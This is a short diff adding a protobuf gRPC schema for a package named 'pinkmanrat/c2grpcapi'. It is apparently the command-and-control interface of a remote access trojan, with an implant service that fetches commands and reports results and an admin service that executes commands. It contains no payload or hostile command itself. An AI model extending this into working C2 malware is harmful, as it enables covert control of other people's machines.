@@ -1,0 +1,20 @@
+syntax = "proto3";
+option go_package = "pinkmanrat/c2grpcapi";
+
+
+service Embed {
+	rpc GetCommand (Empty) returns (Command);
+	rpc SendResult (Command) returns (Empty);
+}
+
+service Admin {
+	rpc ExecuteCommand (Command) returns (Command);
+}
+
+message Command {
+	string Input = 1;
+	string Output = 2;
+}
+
+message Empty {
+}
